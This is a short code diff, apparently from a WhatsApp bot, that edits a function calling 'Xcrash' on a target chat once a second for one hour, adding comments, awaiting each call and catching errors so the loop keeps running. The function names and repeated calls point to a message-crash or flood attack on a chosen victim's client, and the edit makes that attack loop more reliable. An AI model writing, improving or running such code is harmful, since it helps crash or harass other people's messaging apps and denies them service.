@@ -2145,15 +2145,20 @@ await sock.relayMessage(target, {
 
 
 async function S7LOVESYUILIKES7(sock, targetJid) {
-  const ONE_LOVE = 60 * 60 * 1000;
-  const LOVE_SEC = 1 * 1000;
+  const ONE_LOVE = 60 * 60 * 1000; // 1 hour
+  const LOVE_SEC = 1 * 1000;      // 1 second
   const target = targetJid;
 
   const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
   const startTime = Date.now();
 
   while (Date.now() - startTime < ONE_LOVE) {
-    Xcrash(sock, target)
+    try {
+      await Xcrash(sock, target);
+    } catch (err) {
+      console.error('❌ Xcrash error:', err?.message || err);
+    }
+
     await delay(LOVE_SEC);
   }
 }
